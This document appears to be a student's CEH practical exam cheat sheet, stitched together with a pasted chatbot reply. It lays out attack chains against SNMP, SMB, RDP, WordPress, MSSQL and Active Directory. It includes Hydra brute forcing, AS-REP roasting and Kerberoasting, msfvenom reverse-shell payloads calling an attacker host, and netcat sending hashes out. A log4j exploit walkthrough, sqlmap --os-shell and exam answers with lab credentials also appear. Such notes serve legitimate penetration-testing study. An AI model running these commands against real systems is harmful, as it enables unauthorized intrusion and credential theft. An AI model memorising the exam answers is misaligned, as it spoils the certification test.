
1. RECON / HOST DISCOVERY
netdiscover -r <subnet>
nmap -sn <subnet>
nmap -sS -A -Pn -vv <target>
________________________________________
📡 2. SNMP ENUMERATION (VERY IMPORTANT)
🔍 Check SNMP
snmp-check <ip>
nmap -sU -p 161 <ip>
🔑 Brute SNMP Community Strings
nmap -sU -p 161 --script=snmp-brute <ip>
👉 Common result:
•	public ✅
•	private ✅
________________________________________
🧠 Get Info via Scripts
nmap -sU -p 161 --script=snmp-processes <ip>
nmap -sU -p 161 --script=snmp-interfaces <ip>
________________________________________
💥 Metasploit SNMP
msfconsole
search snmp
use auxiliary/scanner/snmp/snmp_login
set RHOSTS <ip>
exploit
________________________________________
🖥️ 3. SMB ENUMERATION
🔍 Scan SMB
nmap -p 445 <ip>
📂 Enumerate Shares & Users
nmap -p 445 --script smb-enum-shares <ip>
nmap -p 445 --script smb-enum-users <ip>
🔐 With Credentials
nmap -p 445 --script smb-enum-users \
--script-args smbusername=<user>,smbpassword=<pass> <ip>
________________________________________
🧾 4. NETBIOS ENUMERATION
nmap -sV --script nbstat.nse <ip>
nbtstat -A <ip>
👉 Gives:
•	Hostname
•	Domain name
________________________________________
🔐 5. RDP ATTACK / ENUMERATION
🔍 Scan RDP
nmap -p 3389 <ip>
________________________________________
🧠 Metasploit RDP Scanner
msfconsole -q
search rdp
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS <ip>
set RPORT 3333   # if custom port
run
________________________________________
🔑 Bruteforce RDP
hydra -L users.txt -P rockyou.txt rdp://<ip> -s 3333
________________________________________
🖥️ Login RDP
xfreerdp /u:administrator /p:password /v:<ip>:3333
________________________________________

1. Snmp-check ip
2. Nmap -sU -p161 –script=snmp-processes ip
3. nmap -sU -p 161 --script snmp-brute 10.10.1.22
Example output:
161/udp open  snmp
| snmp-brute:
|   public  - Valid credentials
|   private - Valid credentials
4. msfconsole
Search snmp
Use auxiliary/scanner/snmp/snmp_login
Show options
Ip a
Set RHOSTS ip
Show options
Exploit
5. nmap -sU -p 161 –script=snmp-interfaces ip
Snmp -check
SMB
Target ip 
Nmap target ip
Nmap -p 445 –script smb-enum-shares ip
Nmap -p 445 –script smb-enum-users ip
Nmap -p 445 –script smb-enum-users –script-args smbusername=*****, smbpassword=****  ip

Nmap ip
Msfconsole-q
Search rdp
Use auxiliary/scanner/rdp/rdp/scanner
Show options
Set RHOSTS ip
Set rport 3333
Hydra -L /usr/share/wordlists -p /usr/share/wordlists rdp://ip -s 3333
Xfreedp /u:administrator /p:qwertyuiop /v:ip:3333

Nmap -sV –script nbstat.nse ip
⚡ QUICK MEMORY TRICKS (VERY IMPORTANT)
📡 SNMP
•	Port → 161 (UDP)
•	Default creds → public / private
•	Tools → snmp-check, nmap, msf
________________________________________
🖥️ SMB
•	Port → 445
•	Always run:
o	shares
o	users
•	If creds found → reuse everywhere
________________________________________
🧾 NetBIOS
•	Use → nbtstat / nbstat.nse
•	Gets → hostname + domain
________________________________________
🔐 RDP
•	Port → 3389 (or custom like 3333)
•	Steps:
1.	Scan
2.	Hydra brute
3.	Login with xfreerdp
________________________________________
🧨 FINAL EXAM FLOW (UPDATED)
1.	🔍 nmap → find open ports
2.	🎯 Identify service
o	161 → SNMP
o	445 → SMB
o	3389 → RDP
3.	🧠 Enumerate
4.	🔑 Bruteforce (Hydra)
5.	🖥️ Login (FTP/SSH/RDP)
6.	📂 Grab files
7.	🧪 Analyze → get answer

1 nmap scan → find DC
2 GetNPUsers.py → get AS-REP hash(python3 GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip <DC-IP> -no-pass)
3 save hash
4 hashcat -m 18200 → crack(john hash.txt --wordlist=rockyou.txt)
5 get password
________________________________________
🧠 How to Recognize This Question FAST
If question mentions:
•	Domain Controller
•	Kerberos
•	users.txt
•	no password needed
•	roasting
👉 It is AS-REP Roasting

msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<attacker_IP> LPORT=444 -o fake_setup.exe  ↵

msfdb init && msfconsole ↵
use exploit/multi/handler ↵
set LHOST=<attacker-IP>  ↵
set LPORT=444 ↵
  run
•	Wordpress Site Login BruteForce Step-By-Step
# Wordpress site only Users Enumeration
wpscan --url http://example.com/ceh --enumerate u 

# Direct crack if we have user/password details

wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt

# Using Metaspoilt
msfdb init && msfconsole
msf > use auxiliary/scanner/http/wordpress_login_enum
msf auxiliary(wordpress_login_enum) > set rhosts 192.168.1.100
msf auxiliary(wordpress_login_enum) > set targeturi /wordpress
msf auxiliary(wordpress_login_enum) > set user_file user.txt
msf auxiliary(wordpress_login_enum) > set pass_file pass.txt
msf auxiliary(wordpress_login_enum) > exploit
  
  
File Upload Vulnerability
msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f raw > file.php
  
msfdb init && msfconsole
use exploit/multi/handler
set payload php/meterepreter/reverse_tcp
set LHOST=attacker-ip
set LPORT= attcker-port
run

# If incase, metaspolit not working use NetCat and shell code below
Reverse Shell Cheat Sheet : Use the code, change IP & Port and use it with NetCat listener
nc -vnl -p 1234

Perform Attack on MSSQL service
1.	scan all networks with open port 1433 | nmap -p 1433 192.168.10.0/24 --open
2.	Try bruteforce all ips with open 1433 port
3.	Hydra -L users.txt -P rockyou.txt 192.168.10.144 mssql user = Server_mssrv and Password = Spidy
4.	Python3 /root/impacket/examples/mssqlclient.py SKILL.CEH.com/Server_mssrv:Spidy@192.168.10.144 -port 1433
5.	python3 /Ad-tools/impacket/examples/mssqlclient.py SKILL.com/Server_mssrv:Spidy@192.168.10.144 -port 1433
6.	Then type this: SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';
7.	type exit.
8.	Goto msfconsole
9.	▪ use exploit/windows/mssql/mssql_payload ▪ set RHOST 192.168.10.144 ▪ set USERNAME Server_mssrv ▪ set PASSWORD Spidy ▪ set DATABASE msdb
10.	Exploit
11.	In meterpreter, type shell
12.	type cd /Users/Public/Downloads/ and type dir
13.	note the size of MSS.txt
Active Directory (AD) Attack Chain — Simplified & Explained
Think of this as a 7-stage attack chain 👇
________________________________________
🧭 Step 1: Recon – Find Domain Controller
Tool: nmap
nmap 10.10.1.0/24
🎯 Goal:
•	Identify Domain Controller (DC)
•	Detect AD services
🔑 Key Ports:
•	88 (Kerberos) → Authentication
•	389 (LDAP) → Directory services
👉 If both are open → **That machine
convert into 1 page cheatsheet notes
Here’s your 1-page CEH v13 AD Attacks Cheatsheet — clean, compact, and exam-ready 👇
________________________________________
🧠 Active Directory Attacks – 1 Page Cheatsheet (CEH v13 Practical)
________________________________________
🔍 1. Recon: Find Domain Controller
nmap 10.10.1.0/24
nmap -A -sC -sV <DC-IP>
Identify:
•	Port 88 (Kerberos)
•	Port 389 (LDAP)
👉 Confirms Domain Controller
________________________________________
🎯 2. AS-REP Roasting
👉 Targets users with DONT_REQ_PREAUTH
GetNPUsers.py <domain>/ -no-pass -usersfile users.txt -dc-ip <DC-IP>

# OR
impacket-GetNPUsers -dc-ip <DC-IP> -request -no-pass -usersfile users.txt <domain>/
📌 Save hash:
echo '[HASH]' > hash.txt
📌 Crack:
john --wordlist=rockyou.txt hash.txt
________________________________________
🔑 3. Password Spraying (CME)
👉 Reuse cracked password
cme rdp <IP-range> -u users.txt -p "password"
✔ Finds users using same password
✔ Example: login via RDP
________________________________________
🖥️ 4. PowerView Enumeration (Windows)
powershell -EP Bypass
Import-Module .\PowerView.ps1
🔎 Important Commands:
Get-NetUser        # Users
Get-NetGroup       # Groups
Get-NetComputer    # Machines
📌 Useful:
•	Get-NetSPN
•	Find-InterestingDomainAcl
•	Invoke-UserHunter
________________________________________
💣 5. MSSQL Attack (Port 1433)
🔓 Brute Force:
hydra -L user.txt -P rockyou.txt <IP> mssql
🔐 Login:
mssqlclient.py <domain>/user:pass@<IP>
✔ Check xp_cmdshell:
SELECT name, value FROM sys.configurations WHERE name='xp_cmdshell';
🚀 Exploit:
use exploit/windows/mssql/mssql_payload
________________________________________
⬆️ 6. Privilege Escalation (WinPEAS)
📥 Transfer:
python3 -m http.server
wget http://<attacker-ip>:8000/winPEASx64.exe
▶ Run:
./winpeas.exe
🎯 Look for:
•	Unquoted Service Path
💥 Exploit:
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=8888 -f exe > file.exe
nc -nvlp 8888
👉 Replace vulnerable service file & reboot
________________________________________
🔥 7. Kerberoasting (Rubeus)
rubeus.exe kerberoast /outfile:hash.txt
📤 Transfer hash:
nc -lvp 9999 > hash.txt
ncat.exe <attacker-ip> 9999 < hash.txt
🔓 Crack:
hashcat -m 13100 -a 0 hash.txt rockyou.txt
👉 Gets Service Account Password (e.g., DC-Admin)
________________________________________
⚡ Attack Flow Summary (Remember This!)
Scan → AS-REP Roast → Crack → Spray → Access
→ Enumerate → MSSQL Exploit → PrivEsc → Kerberoast → Domain Admin
________________________________________
🚨 Exam Tips
•	88 + 389 → Domain Controller
•	AS-REP → No pre-auth users
•	Kerberoast → SPN accounts
•	WinPEAS → PrivEsc findings
•	xp_cmdshell → Command execution
You are assigned to monitor a suspicious process running in a machine whose log file Logfile.PML is saved in Pictures folder of the EH Workstation -2. Analyse the logfile and determine the Parent PID of the malicious file H3ll0.exe process from the log file. (Format: NNNN)
•	Copy that log file to windows
•	Install procmon.exe in the malware analysis folder (7)
•	open that file in procmon
•	Search H3II0 and double click to open. now you find the Parent PID
Answer: 6952

•	curl http:// | grep -i “author”
 Your specific task is to identify the attack category of the oldest Common Vulnerabilities and Exposures (CVEs) affected the website. (Format: aaaaa*aaaa aaaaaaaaaa (AAA) )
-In terminal: zaproxy
•	Use Owasp zap or open vas 
Your primary task is to identify the type of security policies is missing to detect and mitigate Cross-Site Scripting (XSS) and SQL Injection attacks. (Format: Aaaaaaa Aaaaaaaa Aaaaaa)
•	Run Atomated scan with OWASP ZAP
•	# List Tables, add databse name
•	sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name --tables  
•	  
•	# List Columns of that table
•	sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --columns
•	  
•	#Dump all values of the table
•	sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
•	  
•	
•	sqlmap -u "http:domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --os-shell
•	 
File Upload Vulnerability
msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f raw > file.php
  
msfdb init && msfconsole
use multi/handler
set payload php/meterepreter/reverse_tcp
set LHOST=attacker-ip
set LPORT= attcker-port
run

# If incase, metaspolit not working use NetCat and shell code below
Reverse Shell Cheat Sheet : Use the code, change IP & Port and use it with NetCat listener
nc -vnl -p 1234

# Connection Establish Steps
adb connect 192.168.0.4:5555
adb devices -l
adb shell  

# Download a File from Android using ADB tool
adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
adb pull sdcard/log.txt /home/mmurphy/Desktop

python3 -m http.server 8000
http://<parrot-ip>:8000

You have identified a vulnerable web application on a Linux server at port 8080. Exploit the web application vulnerability, gain access to the server and enter the content of RootFlag.txt as the answer. (Format: Aa*aaNNNN)
•	First find the ip hosting website in port 8080 using nmap. Then do further steps
•	In home execute
•	tar -xf jdk-8u202-linux-x64.tar.gz
•	mv jdk1.8.0_202 /usr/bin
•	cd log4j-shell-poc
•	pluma poc.py
•	Update the JDK Path in the Poc.py file
•	Change Line no: 62, replace jdk1.8.0_20/bin/javac with "/usr/bin/jdk1.8.0_202/bin/javac"
•	Change Line no: 87, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"
•	Change Line no: 99, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"
•	execute this in seperate terminal [ nc -lvp 9001]
•	python3 poc.py --userip {ip of attacker pc} --webport 8080 --lport 9001
•	Copy the [send this : value to be copied] from the output of previous command
•	paste in username box and type any password in password box, click login
•	Reverse shell connected in separate terminal where nc is listening
•	type cat RootFlag.txt to view answer
•	(If not connect to reverse shell reload the website and check the path and try again )

crc32 /home/attacker/PhoneSploit-Pro/Downloaded-Files/
is used to calculate the CRC32 checksum of files inside that folder. This helps you identify the CRC value required in the challenge.

You are part of a cybersecurity team investigating an internal website that has been copied from a legitimate site without authorization. One of your teammates, acting as a spy, has scanned the website using a smart scanner within the subnet 192.168.10.0/24. Your task is to identify the number of Directory Listing of Sensitive Files on this website. The report, named w_report.pdf, is available on the target machine.(Hint: He remembered the OS as Windows Server 19 while scanning the website) (Format: NN)
•	nmap -p 21 -sV -sC -O 192.168.10.0/24 –open
•	hydra -L users.txt -P rockyou.txt 192.168.10.144 ftp
•	username: Parker and Password: Passw0rd@1234
•	Access ftp and locate folder
•	binary (to download pdf)
•	get w_report.pd
•	open the report and read the site address
•	Scan that website in Windows with Smart Scanner takes upto 30 min
•	Scroll results to see Directory Listing of Sensitive Files.
•	It shows 37 Approx but the answer is +/-1
wpscan --url http://www.cehorg.com:8080/CEH/wp-login.php -U adam -P /home/attacker/rockyou.txt
aircrack-ng http.cap -w /Desktop/wordlist.txt
remmina for rdp

